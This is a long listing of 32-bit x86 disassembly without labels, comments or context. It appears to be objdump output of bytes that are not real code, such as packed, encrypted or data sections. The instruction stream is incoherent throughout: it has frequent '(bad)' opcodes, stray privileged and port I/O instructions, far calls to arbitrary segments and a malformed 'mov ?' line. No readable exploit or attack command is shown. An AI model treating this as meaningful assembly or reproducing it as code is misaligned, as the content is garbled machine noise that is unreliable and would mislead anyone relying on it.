  40b9dd:	pop    edi
  40b9de:	xor    bh,BYTE PTR [edx+0x3ad71624]
  40b9e4:	push   0xffffff98
  40b9e6:	(bad)  
  40b9e8:	and    BYTE PTR [esi+0x13],ah
  40b9eb:	add    esp,DWORD PTR [eax+0x57d20f55]
  40b9f1:	ins    BYTE PTR es:[edi],dx
  40b9f2:	xchg   ebp,eax
  40b9f3:	mov    edx,0x6a8c076
  40b9f8:	xchg   esp,eax
  40b9f9:	and    dh,cl
  40b9fb:	stc    
  40b9fc:	jnp    0x40b9db
  40b9fe:	fwait
  40b9ff:	mov    esi,0xe0103afa
  40ba04:	inc    esp
  40ba05:	or     al,0x41
  40ba07:	dec    edx
  40ba08:	dec    edx
  40ba09:	ds cli 
  40ba0b:	icebp  
  40ba0c:	jp     0x40b9a0
  40ba0e:	jns    0x40ba71
  40ba10:	stos   BYTE PTR es:[edi],al
  40ba11:	mov    esi,0xd8e046d7
  40ba16:	mov    BYTE PTR [ecx+0x6],dh
  40ba19:	xor    BYTE PTR [esi],al
  40ba1b:	call   0x3cf:0x24fcf084
  40ba22:	sti    
  40ba23:	and    eax,0xc088fdf4
  40ba28:	and    BYTE PTR [edx],al
  40ba2a:	xor    DWORD PTR [edx+0x54dcb8f4],edi
  40ba30:	sahf   
  40ba31:	push   es
  40ba32:	and    ebp,DWORD PTR [edx+0x2a]
  40ba35:	dec    ebp
  40ba36:	in     al,dx
  40ba37:	scas   eax,DWORD PTR es:[edi]
  40ba38:	xor    dl,BYTE PTR [ebx]
  40ba3a:	mov    al,0x14
  40ba3c:	shl    DWORD PTR [ecx],1
  40ba3e:	sbb    al,0x2
  40ba40:	xchg   ecx,eax
  40ba41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba42:	fist   WORD PTR [edi+0x2ab880a3]
  40ba48:	jmp    0x40bab0
  40ba4a:	push   esp
  40ba4b:	test   esi,ebp
  40ba4d:	into   
  40ba4e:	pop    ebx
  40ba4f:	retf   0x9380
  40ba52:	adc    al,0x34
  40ba54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba55:	outs   dx,BYTE PTR ds:[esi]
  40ba56:	mov    gs,WORD PTR [edx+ebx*2+0x18]
  40ba5a:	xchg   edx,eax
  40ba5b:	outs   dx,DWORD PTR ds:[esi]
  40ba5c:	(bad)  
  40ba5d:	or     BYTE PTR [edx+0x48],al
  40ba60:	dec    esi
  40ba61:	cvtps2pd xmm2,QWORD PTR [ecx]
  40ba64:	ret    0x18a3
  40ba67:	push   ebx
  40ba68:	pop    edi
  40ba69:	mov    dh,bl
  40ba6b:	push   edi
  40ba6c:	fcom   DWORD PTR [esi+0x894edf1]
  40ba72:	clc    
  40ba73:	(bad)  
  40ba74:	sub    eax,0x45ead222
  40ba79:	test   al,0x57
  40ba7b:	scas   eax,DWORD PTR es:[edi]
  40ba7c:	push   es
  40ba7d:	xchg   DWORD PTR [ecx+edx*2],ecx
  40ba80:	mov    esp,0xae0219eb
  40ba85:	jl     0x40ba7f
  40ba87:	cmp    eax,0xac0ca4bc
  40ba8c:	gs jnp 0x40ba4d
  40ba8f:	shr    DWORD PTR [esi+0x67],1
  40ba92:	mov    ds:0x9e8c215f,eax
  40ba97:	out    0xbb,eax
  40ba99:	dec    edx
  40ba9a:	mov    cl,0x9c
  40ba9c:	in     eax,0xd9
  40ba9e:	adc    eax,0xd08f573f
  40baa3:	xchg   edi,eax
  40baa4:	dec    edx
  40baa5:	test   BYTE PTR [edx],dh
  40baa7:	mov    BYTE PTR [ecx-0x7e],bl
  40baaa:	div    BYTE PTR [ebx-0x73]
  40baad:	imul   ebp,DWORD PTR ds:0xd3e357b2,0x3fa24e98
  40bab7:	fs jae 0x40bb26
  40baba:	add    ah,dl
  40babc:	scas   eax,DWORD PTR es:[edi]
  40babd:	adc    ebp,ebp
  40babf:	xchg   DWORD PTR [ecx+0x138bc278],edx
  40bac5:	icebp  
  40bac6:	test   DWORD PTR [edx-0x27],esi
  40bac9:	add    BYTE PTR [ebp-0x5f],dl
  40bacc:	pop    ebx
  40bacd:	mov    WORD PTR [edx],fs
  40bacf:	xchg   ecx,eax
  40bad0:	fmul   QWORD PTR [edi-0x34]
  40bad3:	imul   ecx,DWORD PTR ds:0xc6962557,0x2a383f5
  40badd:	addr16 xor eax,0x276cc66a
  40bae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae4:	sbb    edi,0x69
  40bae7:	jb     0x40bab4
  40bae9:	mov    cl,0xff
  40baeb:	icebp  
  40baec:	repz icebp 
  40baee:	inc    ebp
  40baef:	leave  
  40baf0:	mov    WORD PTR [esi],ss
  40baf2:	inc    ebp
  40baf3:	shl    eax,0x93
  40baf6:	scas   al,BYTE PTR es:[edi]
  40baf7:	js     0x40bad9
  40baf9:	in     al,0xfc
  40bafb:	mov    ch,0xab
  40bafd:	retf   0x3393
  40bb00:	(bad)  
  40bb01:	and    WORD PTR [ecx+0x591e1dda],cx
  40bb08:	sbb    bh,BYTE PTR [esi-0x2faa5d8]
  40bb0e:	out    dx,al
  40bb0f:	cs retf 0xee69
  40bb13:	adc    DWORD PTR [edx],0x8a2dcaf3
  40bb19:	xchg   DWORD PTR [edi+eiz*8+0x1d],esp
  40bb1d:	das    
  40bb1e:	scas   eax,DWORD PTR es:[edi]
  40bb1f:	lods   al,BYTE PTR ds:[esi]
  40bb20:	dec    edx
  40bb21:	ds ret 
  40bb23:	inc    ebp
  40bb24:	xor    edi,DWORD PTR [esp+eax*4+0x60375ea7]
  40bb2b:	push   es
  40bb2c:	sbb    DWORD PTR [edx-0x17],edi
  40bb2f:	in     al,dx
  40bb30:	push   eax
  40bb31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb32:	pop    esp
  40bb33:	aaa    
  40bb34:	pop    edi
  40bb35:	(bad)  
  40bb36:	sub    esi,DWORD PTR [esp+ebp*1+0x77]
  40bb3a:	mov    ss:0x13feac38,eax
  40bb40:	(bad)  
  40bb41:	pop    ss
  40bb42:	lea    esp,[esp+eax*1+0x35904fc6]
  40bb49:	mov    esp,0xbf1665bf
  40bb4e:	xchg   edi,eax
  40bb4f:	sub    BYTE PTR [di-0x205a],0xd2
  40bb55:	jecxz  0x40bafa
  40bb57:	cmp    ebp,eax
  40bb59:	lock addr16 add al,0x34
  40bb5d:	sub    eax,0x89f34f5e
  40bb62:	(bad)  
  40bb64:	rdpmc  
  40bb66:	mul    cl
  40bb68:	hlt    
  40bb69:	or     DWORD PTR [eax+ebx*1-0x6177a30],edi
  40bb70:	xlat   BYTE PTR ds:[ebx]
  40bb71:	retf   0xf2ef
  40bb74:	test   eax,0x798a5112
  40bb79:	daa    
  40bb7a:	mov    ebx,0xee59a6f4
  40bb7f:	adc    dl,BYTE PTR [ecx+eiz*1+0x5c62dd67]
  40bb86:	mov    ecx,0xf4d7542e
  40bb8b:	mov    eax,DWORD PTR [edi+0x7a]
  40bb8e:	cmp    al,0xb8
  40bb90:	arpl   WORD PTR [esi+0x37],ax
  40bb93:	sub    ch,ch
  40bb95:	lea    edx,[edi-0xa]
  40bb98:	push   edi
  40bb99:	aam    0xe1
  40bb9b:	adc    eax,ecx
  40bb9d:	aad    0x32
  40bb9f:	hlt    
  40bba0:	scas   eax,DWORD PTR es:[edi]
  40bba1:	sub    DWORD PTR [ebx+0x1ab38083],esp
  40bba7:	dec    edi
  40bba8:	or     eax,0xd29b8c25
  40bbad:	jl     0x40bc20
  40bbaf:	and    ah,BYTE PTR [esi]
  40bbb1:	push   0x43
  40bbb3:	cmc    
  40bbb4:	lea    ebx,[eax-0x6a]
  40bbb7:	xor    eax,0x747efd5a
  40bbbc:	mul    esi
  40bbbe:	js     0x40bbff
  40bbc0:	mov    ch,0xa3
  40bbc2:	jmp    0x40bc2d
  40bbc4:	xchg   esp,eax
  40bbc5:	pusha  
  40bbc6:	sar    DWORD PTR [ecx+0x44],1
  40bbc9:	mov    BYTE PTR [edx],ch
  40bbcb:	addr16 dec esp
  40bbcd:	scas   eax,DWORD PTR es:[edi]
  40bbce:	add    al,0x5d
  40bbd0:	in     eax,0x73
  40bbd2:	addr16 pop edx
  40bbd4:	adc    BYTE PTR [eax+ebx*4],al
  40bbd7:	add    DWORD PTR [esi-0x4d151ac6],edx
  40bbdd:	jp     0x40bbb2
  40bbdf:	in     eax,0xce
  40bbe1:	lock retf 
  40bbe3:	and    BYTE PTR [ebx+0x35],dh
  40bbe6:	push   0xffffffcf
  40bbe8:	test   dh,al
  40bbea:	into   
  40bbeb:	ins    BYTE PTR es:[edi],dx
  40bbec:	test   DWORD PTR ds:0x9d64c8c1,0x30a88918
  40bbf6:	xlat   BYTE PTR ds:[ebx]
  40bbf7:	nop
  40bbf8:	jp     0x40bb9a
  40bbfa:	or     al,0x6b
  40bbfc:	mov    ah,0xc8
  40bbfe:	loope  0x40bb85
  40bc00:	adc    eax,edx
  40bc02:	inc    edi
  40bc03:	imul   esp,DWORD PTR [eax+0x6032dad5],0x8
  40bc0a:	xchg   DWORD PTR [ebx-0x64ae8097],esp
  40bc10:	in     al,0xd6
  40bc12:	jae    0x40bb9e
  40bc14:	test   DWORD PTR [ecx+0x47fba6ff],eax
  40bc1a:	mov    dh,0x4c
  40bc1c:	retf   
  40bc1d:	adc    eax,DWORD PTR [edx-0x45b3fdb7]
  40bc23:	jg     0x40bc2c
  40bc25:	pushf  
  40bc26:	or     ecx,esp
  40bc28:	mul    BYTE PTR [ebx*1+0x33b96638]
  40bc2f:	(bad)  
  40bc30:	lea    edi,[edx+0x6485c4b1]
  40bc36:	cdq    
  40bc37:	adc    al,0x44
  40bc39:	mov    eax,0x8dc4b9ae
  40bc3e:	jl     0x40bcab
  40bc40:	(bad)  
  40bc41:	mov    edx,DWORD PTR [edx-0x46]
  40bc44:	outs   dx,BYTE PTR ds:[esi]
  40bc45:	sahf   
  40bc46:	mov    eax,ds:0x780a4025
  40bc4b:	retf   
  40bc4c:	add    BYTE PTR [ebx+0x8],0x63
  40bc50:	add    DWORD PTR [eax-0x4f],esp
  40bc53:	mov    dl,0xdb
  40bc55:	cmp    eax,0x8f654957
  40bc5a:	bound  edi,QWORD PTR [ebp+0x176a16e1]
  40bc60:	cmc    
  40bc61:	loop   0x40bc3a
  40bc63:	sar    BYTE PTR [ecx+eiz*8],1
  40bc66:	pop    ebp
  40bc67:	mov    ch,BYTE PTR ds:0x49e446ea
  40bc6d:	push   eax
  40bc6e:	idiv   BYTE PTR [esi-0xed4c5e]
  40bc74:	cld    
  40bc75:	add    eax,eax
  40bc77:	ds adc al,0xb7
  40bc7a:	cwde   
  40bc7b:	xchg   esp,eax
  40bc7c:	sbb    eax,0x27d16400
  40bc81:	stos   DWORD PTR es:[edi],eax
  40bc82:	adc    al,0x95
  40bc84:	sbb    ebp,eax
  40bc86:	addr16 push esp
  40bc88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc89:	dec    DWORD PTR [edx+0x73ef1604]
  40bc8f:	dec    edi
  40bc90:	stc    
  40bc91:	xchg   DWORD PTR [esi-0x101b5aa5],esp
  40bc97:	ret    
  40bc98:	inc    ecx
  40bc99:	fmul   DWORD PTR ds:0xcfa1bd6c
  40bc9f:	mov    cl,al
  40bca1:	dec    edx
  40bca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bca3:	(bad)  
  40bca4:	push   ds
  40bca5:	push   0xffffffa0
  40bca7:	sbb    BYTE PTR [ecx],dl
  40bca9:	xchg   edi,eax
  40bcaa:	sub    BYTE PTR [ebx-0x4d4efde0],cl
  40bcb0:	mov    esi,0x3bc0b9
  40bcb5:	jmp    0x5cfb4e22
  40bcba:	icebp  
  40bcbb:	jmp    0xad02:0x2f876a9c
  40bcc2:	or     BYTE PTR [ecx+ecx*1],dl
  40bcc5:	jp     0x8339517a
  40bccb:	clc    
  40bccc:	imul   ebx,ecx,0x34
  40bccf:	pop    edi
  40bcd0:	mov    ds:0x1a04f5c7,al
  40bcd5:	fimul  DWORD PTR [eax+eax*4+0x5b9fd2cb]
  40bcdc:	mov    edx,0x666e75c4
  40bce1:	mov    al,ds:0x9af8fb16
  40bce6:	inc    esp
  40bce7:	pop    eax
  40bce8:	xchg   ebx,eax
  40bce9:	inc    esp
  40bcea:	lods   eax,DWORD PTR ds:[esi]
  40bceb:	dec    esi
  40bcec:	xor    al,0xc5
  40bcee:	inc    esi
  40bcef:	ret    
  40bcf0:	out    0x99,eax
  40bcf2:	outs   dx,DWORD PTR ds:[esi]
  40bcf3:	dec    ecx
  40bcf4:	xchg   ebx,eax
  40bcf5:	in     eax,dx
  40bcf6:	adc    al,BYTE PTR [edi+0x1f]
  40bcf9:	mov    eax,ds:0x4d16bb77
  40bcfe:	addr16 jns 0x40bd1d
  40bd01:	jecxz  0x40bca4
  40bd03:	jb     0x40bd09
  40bd05:	push   0xe67f5b8b
  40bd0a:	inc    edx
  40bd0b:	fiadd  WORD PTR [ecx+0x3086c47e]
  40bd11:	jnp    0x40bc97
  40bd13:	fld    DWORD PTR [ecx+0x5f8775bd]
  40bd19:	pop    ds
  40bd1a:	xchg   dl,ch
  40bd1c:	mov    al,0xdb
  40bd1e:	into   
  40bd1f:	cmp    eax,0xab59c25
  40bd24:	ja     0x40bd48
  40bd26:	into   
  40bd27:	sar    DWORD PTR [esi+eiz*4+0x62],0x4c
  40bd2c:	mov    ch,0xd5
  40bd2e:	pop    ebp
  40bd2f:	add    ebx,DWORD PTR [ebx-0x79]
  40bd32:	sbb    BYTE PTR ds:[ebp+edx*8-0x317ddc49],ch
  40bd3a:	jbe    0x40bd5c
  40bd3c:	enter  0x88cb,0x1f
  40bd40:	call   0x64992242
  40bd45:	push   ecx
  40bd46:	outs   dx,DWORD PTR ds:[esi]
  40bd47:	cmc    
  40bd48:	mov    edx,0x4992075a
  40bd4d:	fist   DWORD PTR [ebx-0x45]
  40bd50:	test   eax,0xf7ad7468
  40bd55:	mov    BYTE PTR [ecx],bl
  40bd57:	jge    0x40bdaf
  40bd59:	cmp    ch,BYTE PTR [ecx+ecx*2+0x6d]
  40bd5d:	fucomi st,st(4)
  40bd5f:	or     cl,BYTE PTR [eax-0x5e3b0e57]
  40bd65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd66:	ins    DWORD PTR es:[edi],dx
  40bd67:	push   0x21
  40bd69:	xchg   BYTE PTR [edi-0x6db0b8db],ch
  40bd6f:	pusha  
  40bd70:	int3   
  40bd71:	mov    dh,0x17
  40bd73:	push   0xffffffaf
  40bd75:	les    ebx,FWORD PTR fs:[ecx+0x9]
  40bd79:	add    ah,ch
  40bd7b:	or     DWORD PTR [edi+0x43942a97],eax
  40bd81:	pop    ebp
  40bd82:	hlt    
  40bd83:	ins    BYTE PTR es:[edi],dx
  40bd84:	(bad)  
  40bd85:	rcr    BYTE PTR [edx-0x14],0xef
  40bd89:	sbb    al,0xda
  40bd8b:	mov    eax,0xee4b398b
  40bd90:	add    cl,BYTE PTR [ebx+0x42]
  40bd93:	mov    edi,0xe2b076b
  40bd98:	cmp    eax,0x76e5a360
  40bd9d:	shrd   DWORD PTR [ebp+0x2f272768],edx,cl
  40bda4:	rcr    bh,cl
  40bda6:	adc    eax,0xd67a17a0
  40bdab:	mov    ecx,ebp
  40bdad:	mov    ah,bl
  40bdaf:	aam    0x90
  40bdb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb2:	stos   DWORD PTR es:[edi],eax
  40bdb3:	retf   0xef16
  40bdb6:	inc    edi
  40bdb7:	ret    
  40bdb8:	cmp    eax,0x89aa227a
  40bdbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdbe:	dec    esi
  40bdbf:	adc    DWORD PTR [edi-0x7f],0xffffff82
  40bdc3:	fcomip st,st(0)
  40bdc5:	adc    ch,dl
  40bdc7:	xchg   cx,ax
  40bdc9:	ins    BYTE PTR es:[edi],dx
  40bdca:	push   esp
  40bdcb:	loopne 0x40bd54
  40bdcd:	adc    al,0xd7
  40bdcf:	inc    esp
  40bdd0:	ja     0x40bde8
  40bdd2:	outs   dx,DWORD PTR ds:[esi]
  40bdd3:	ror    bl,cl
  40bdd5:	pop    ebx
  40bdd6:	push   edx
  40bdd7:	test   al,0x9b
  40bdd9:	leave  
  40bdda:	add    DWORD PTR [ecx+ecx*4-0x4f6f156],esp
  40bde1:	inc    ebx
  40bde2:	and    ebp,ecx
  40bde4:	xchg   BYTE PTR [ebx],dl
  40bde6:	in     eax,0xa4
  40bde8:	push   ds
  40bde9:	sbb    DWORD PTR [eax+0x2a],ebp
  40bdec:	push   edi
  40bded:	cmp    eax,0xf9867ac
  40bdf2:	adc    DWORD PTR [edi+eiz*2-0x46],ebp
  40bdf6:	xchg   ebp,eax
  40bdf7:	and    DWORD PTR [esi],0xffffff9f
  40bdfa:	shrd   eax,ecx,0x2
  40bdfe:	shr    ecx,0x2
  40be01:	mov    ecx,DWORD PTR [ebp-0x60]
  40be04:	jmp    0x40c38e
  40be09:	jge    0x40be08
  40be0b:	or     BYTE PTR [edx+eax*4],0x79
  40be0f:	js     0x40be8d
  40be11:	xor    edi,DWORD PTR [edx-0x34]
  40be14:	outs   dx,BYTE PTR ds:[esi]
  40be15:	pop    esp
  40be16:	fstp   QWORD PTR [esi]
  40be18:	test   al,0x1f
  40be1a:	call   0x47dd435
  40be1f:	push   ss
  40be20:	push   ss
  40be21:	and    BYTE PTR [ebx+eiz*8],bl
  40be24:	pop    ds
  40be25:	ret    0x9198
  40be28:	mov    al,ds:0x7e958f53
  40be2d:	ds lock imul esi,ecx,0x36490ef1
  40be35:	sti    
  40be36:	dec    ebx
  40be37:	add    al,0x79
  40be39:	xor    dl,BYTE PTR [ebx+0xdc7244d]
  40be3f:	shl    DWORD PTR [edi+0x5a],cl
  40be42:	lea    ebp,[eax-0x3ef88b0]
  40be48:	rcr    BYTE PTR [eax-0x2b058e43],0x12
  40be4f:	pop    ebp
  40be50:	loopne 0x40be2d
  40be52:	lds    ebp,FWORD PTR [edx+edi*2-0x4e7af873]
  40be59:	jl     0x40bde2
  40be5b:	mov    ebx,esp
  40be5d:	loopne 0x40be45
  40be5f:	adc    eax,0xd65cfb67
  40be64:	inc    edx
  40be65:	xchg   edi,eax
  40be66:	jno    0x40be43
  40be68:	xor    eax,0x108bea3
  40be6d:	mov    DWORD PTR [edi+0x25],esi
  40be70:	xchg   esp,eax
  40be71:	dec    esi
  40be72:	push   0xe82d6b50
  40be77:	loop   0x40be11
  40be79:	xlat   BYTE PTR ds:[ebx]
  40be7a:	push   es
  40be7b:	adc    BYTE PTR ss:[ebx-0x6b],0x25
  40be80:	xor    esi,DWORD PTR [ebx]
  40be82:	dec    eax
  40be83:	xchg   ebx,eax
  40be84:	mov    esi,0x7343e5
  40be89:	repz dec ecx
  40be8b:	jecxz  0x40be2b
  40be8d:	mov    ?,WORD PTR [edx+edx*1-0x39]
  40be91:	ror    al,1
  40be93:	in     eax,0x76
  40be95:	stc    
  40be96:	xchg   ecx,eax
  40be97:	push   0x46
  40be99:	sub    al,0x1f
  40be9b:	mov    ds,WORD PTR [edx-0x2aa0d11a]
  40bea1:	push   ss
  40bea2:	push   ebx
  40bea3:	call   0x4ea63fed
  40bea8:	inc    eax
  40bea9:	mov    WORD PTR [eax+0x302cbc62],es
  40beaf:	scas   al,BYTE PTR es:[edi]
  40beb0:	fsubr  QWORD PTR [edi-0x611aed67]
  40beb6:	shl    BYTE PTR ds:0x53694b2c,0x8b
  40bebd:	lock paddsw mm2,QWORD PTR [eax+0x4997a4a2]
  40bec5:	shl    DWORD PTR [eax+0x7],0x1e
  40bec9:	xchg   ebp,eax
  40beca:	or     bl,dl
  40becc:	push   eax
  40becd:	mov    dh,0xd9
  40becf:	cmp    esp,DWORD PTR ds:0xa7b7c5e0
  40bed5:	fwait
  40bed6:	jne    0x40bf10
  40bed8:	repz lahf 
  40beda:	pushf  
  40bedb:	push   0x78
  40bedd:	or     BYTE PTR ds:0x8c522d85,dl
  40bee3:	push   ecx
  40bee4:	aad    0x59
  40bee6:	into   
  40bee7:	pop    ebx
  40bee8:	cmp    eax,0x360c7bc8
  40beed:	dec    ebp
  40beee:	dec    ecx
  40beef:	push   ecx
  40bef0:	or     ebx,ebx
  40bef2:	call   0xd4e2:0xfcdae846
  40bef9:	sub    DWORD PTR [ebx+0x11],0x5d
  40befd:	or     DWORD PTR [ecx-0xee2d8cc],ebp
  40bf03:	inc    esp
  40bf04:	pop    edx
  40bf05:	in     eax,0x52
  40bf07:	ins    DWORD PTR es:[edi],dx
  40bf08:	pop    esi
  40bf09:	sbb    al,0xd
  40bf0b:	pop    edi
  40bf0c:	dec    ebx
  40bf0d:	fwait
  40bf0e:	daa    
  40bf0f:	in     eax,dx
  40bf10:	push   esi
  40bf11:	not    DWORD PTR [esi+eax*1]
  40bf14:	mov    al,ds:0x4f979457
  40bf19:	test   DWORD PTR [esp+ecx*1],0x2a8c777e
  40bf20:	sbb    eax,0x33ffca6b
  40bf25:	cmp    eax,0x6ddaea22
  40bf2a:	scas   eax,DWORD PTR es:[edi]
  40bf2b:	jmp    0x40bf99
  40bf2d:	pusha  
  40bf2e:	ins    DWORD PTR es:[edi],dx
  40bf2f:	mov    esi,0xf3a30c9a
  40bf34:	push   esi
  40bf35:	fcmovne st,st(5)
  40bf37:	sar    BYTE PTR [ecx+0x24155df1],cl
  40bf3d:	xchg   ebp,eax
  40bf3e:	aas    
  40bf3f:	dec    eax
  40bf40:	inc    edx
  40bf41:	jno    0x40bf1a
  40bf43:	lds    edx,FWORD PTR [ecx-0x21e45045]
  40bf49:	fldcw  WORD PTR [edx-0x4dc00ce6]
  40bf4f:	test   eax,0xf2ee1292
  40bf54:	mov    bl,0x20
  40bf56:	arpl   WORD PTR [eax-0x2668ef21],dx
  40bf5c:	int3   
  40bf5d:	(bad)  
  40bf5e:	mov    bl,bh
  40bf60:	and    al,bh
  40bf62:	pushf  
  40bf63:	jb     0x40bee7
  40bf65:	jno    0x40beed
  40bf67:	or     DWORD PTR [ebp+0x3e4deafd],esp
  40bf6d:	cmp    ebp,DWORD PTR [edx]
  40bf6f:	fdiv   DWORD PTR [ebx+0x25]
  40bf72:	add    ebx,DWORD PTR [edi+edx*8]
  40bf75:	xor    DWORD PTR [ebp-0x3],esi
  40bf78:	clc    
  40bf79:	mov    ecx,DWORD PTR ds:0x85bfb123
  40bf7f:	stos   DWORD PTR es:[edi],eax
  40bf80:	in     eax,dx
  40bf81:	jle    0x40bf88
  40bf83:	les    esp,FWORD PTR [ebx]
  40bf85:	fwait
  40bf86:	adc    BYTE PTR [ebp+0x67c1ed4c],cl
  40bf8c:	xchg   edi,eax
  40bf8d:	sbb    edi,DWORD PTR [edx+0x76f61c6f]
  40bf93:	sahf   
  40bf94:	and    cl,dh
  40bf96:	mov    ebx,0x35085043
  40bf9b:	add    eax,0x94bdb2ce
  40bfa0:	push   ecx
  40bfa1:	pop    ds
  40bfa2:	leave  
  40bfa3:	add    esp,DWORD PTR [eax-0x232eb595]
  40bfa9:	daa    
  40bfaa:	mov    WORD PTR [edx],gs
  40bfac:	mov    ebx,0x495829c4
  40bfb1:	in     al,0xeb
  40bfb3:	in     eax,0x5a
  40bfb5:	or     dl,dh
  40bfb7:	pushf  
  40bfb8:	imul   edx,DWORD PTR [eax+0x6f],0xabe37fb5
  40bfbf:	(bad)  [esi-0x5def54b2]
  40bfc5:	test   cl,cl
  40bfc7:	jmp    0x40c00e
  40bfc9:	inc    ebx
  40bfca:	push   cs
  40bfcb:	outs   dx,DWORD PTR ds:[esi]
  40bfcc:	mov    eax,DWORD PTR ds:0x5edbdabb
  40bfd2:	mov    edx,0x7cf6f85b
  40bfd7:	sar    BYTE PTR [eax-0x2],cl
  40bfda:	test   DWORD PTR [ebx-0x4a224f5a],ebx
  40bfe0:	dec    ebp
  40bfe1:	dec    ebp
  40bfe2:	ds push esi
  40bfe4:	test   DWORD PTR [ebx-0x45],ecx
  40bfe7:	fst    DWORD PTR [ebx+0x78c65cbc]
  40bfed:	sbb    BYTE PTR [edi+0x6a],dh
  40bff0:	mov    cs,WORD PTR [edi+0x20b3608a]
  40bff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bff7:	call   0xed233246
  40bffc:	sti    
  40bffd:	cwde   
  40bffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfff:	jmp    0x3c3c5105
  40c004:	xor    BYTE PTR [esi-0x6db553d8],ah
  40c00a:	xchg   ebx,eax
  40c00b:	mov    ch,0xc
  40c00d:	mov    DWORD PTR [ebx+0xfeb9535],ecx
  40c013:	jb     0x40bfe2
  40c015:	dec    ebp
  40c016:	or     DWORD PTR [ebx-0x49e1e913],eax
  40c01c:	fwait
  40c01d:	mov    dl,0xfc
  40c01f:	sti    
  40c020:	retf   0xcfc9
  40c023:	mov    ah,dl
  40c025:	add    edi,DWORD PTR [ebp-0x4b]
  40c028:	inc    ebp
  40c029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c02a:	aaa    
  40c02b:	push   ecx
  40c02c:	sub    al,0xed
  40c02e:	adc    eax,0x443d2d6c
  40c033:	xchg   ebp,edx
  40c035:	mov    DWORD PTR [ecx-0x389e960],ebp
  40c03b:	and    dh,BYTE PTR [ebp-0x4ca301ed]
  40c041:	jg     0x40c02d
  40c043:	repz lahf 
  40c045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c046:	jp     0x40c0a7
  40c048:	loopne 0x40c0b2
  40c04a:	push   es
  40c04b:	jge    0x40c014
  40c04d:	test   ah,cl
  40c04f:	sub    BYTE PTR [ebp-0x7ce076a],bh
  40c055:	jecxz  0x40c0ce
  40c057:	jb     0x40c09d
  40c059:	repz xchg esp,eax
  40c05b:	mov    ds,WORD PTR [ebp-0x9d81c45]
  40c061:	or     BYTE PTR [eax],dl
  40c063:	addr16 push esi
  40c065:	std    
  40c066:	mov    edx,0x6e060341
  40c06b:	les    esi,FWORD PTR [edx]
  40c06d:	aaa    
  40c06e:	jl     0x40c005
  40c070:	pop    ecx
  40c071:	(bad)  
  40c073:	int3   
  40c074:	and    BYTE PTR [edx+0x77],ah
  40c077:	dec    edi
  40c078:	xchg   bx,ax
  40c07a:	outs   dx,BYTE PTR ds:[esi]
  40c07b:	ret    
  40c07c:	jg     0x40c0ed
  40c07e:	ss dec eax
  40c080:	jle    0x40c0fc
  40c082:	and    DWORD PTR [ecx+0x1],ecx
  40c085:	(bad)  
  40c086:	cdq    
  40c087:	imul   eax,DWORD PTR ds:0x11f5fd12,0x73
  40c08e:	into   
  40c08f:	ret    
  40c090:	fistp  DWORD PTR [ecx+0x7]
  40c093:	inc    eax
  40c094:	imul   esi,DWORD PTR [eax+0x35],0x29
  40c098:	in     al,dx
  40c099:	adc    eax,0xc4e21925
  40c09e:	and    al,0x65
  40c0a0:	mov    edi,0x6289a952
  40c0a5:	nop
  40c0a6:	pop    esi
  40c0a7:	ins    BYTE PTR es:[edi],dx
  40c0a8:	adc    DWORD PTR [edi],0xffffffca
  40c0ab:	xchg   esp,eax
  40c0ac:	sub    DWORD PTR [ebp-0x1344bd11],edi
  40c0b2:	loope  0x40c0bf
  40c0b4:	pavgw  mm7,QWORD PTR [ebx]
  40c0b7:	or     ch,BYTE PTR [ebp+esi*1+0x70]
  40c0bb:	jne    0x40c132
  40c0bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0be:	cmp    eax,0x76a943b4
  40c0c3:	jge    0x40c097
  40c0c5:	outs   dx,DWORD PTR ds:[esi]
  40c0c6:	adc    esp,DWORD PTR [ecx+0x2073d2b0]
  40c0cc:	sti    
  40c0cd:	xor    al,0xa6
  40c0cf:	dec    edi
  40c0d0:	dec    esp
  40c0d1:	mov    ebx,0xe4df6974
  40c0d6:	xchg   ecx,eax
  40c0d7:	fsubr  DWORD PTR [ebp-0x75]
  40c0da:	mov    ch,0x12
  40c0dc:	xor    al,0xcb
  40c0de:	mov    bh,0xf9
  40c0e0:	das    
  40c0e1:	mov    BYTE PTR [esi],cl
  40c0e3:	ins    DWORD PTR es:[edi],dx
  40c0e4:	add    BYTE PTR [edi+0x7b701825],bh
  40c0ea:	adc    cl,BYTE PTR [esp+esi*8+0x74ac7fbe]
  40c0f1:	ror    DWORD PTR [ebp-0x3e],cl
  40c0f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0f5:	mov    ss,WORD PTR [esp+ecx*8-0x7b9fbab7]
  40c0fc:	call   0x21bd8333
  40c101:	loopne 0x40c107
  40c103:	mov    bh,0x8
  40c105:	adc    BYTE PTR [ecx-0x68],0xd5
  40c109:	mov    dl,bl
  40c10b:	dec    ebp
  40c10c:	sbb    esp,DWORD PTR [edx+edi*8]
  40c10f:	test   bh,0xc5
  40c112:	pop    ecx
  40c113:	les    edx,FWORD PTR [edi]
  40c115:	inc    ecx
  40c116:	dec    esp
  40c117:	xchg   bl,bh
  40c119:	inc    esp
  40c11a:	adc    eax,0xf342165d
  40c11f:	out    dx,al
  40c120:	xor    eax,0xc2617915
  40c125:	xchg   BYTE PTR [ebx+0x44],cl
  40c128:	mov    dl,0x91
  40c12a:	or     esi,ebp
  40c12c:	nop
  40c12d:	xchg   esi,eax
  40c12e:	mov    edx,0x7b9dea69
  40c133:	xchg   ebx,eax
  40c134:	(bad)  
  40c135:	mov    edi,DWORD PTR [ecx+0x570cc1f8]
  40c13b:	clc    
  40c13c:	es push ds
  40c13e:	lods   eax,DWORD PTR ds:[esi]
  40c13f:	inc    esi
  40c140:	hlt    
  40c141:	and    DWORD PTR [ebp+0x7a],esi
  40c144:	or     edi,ebx
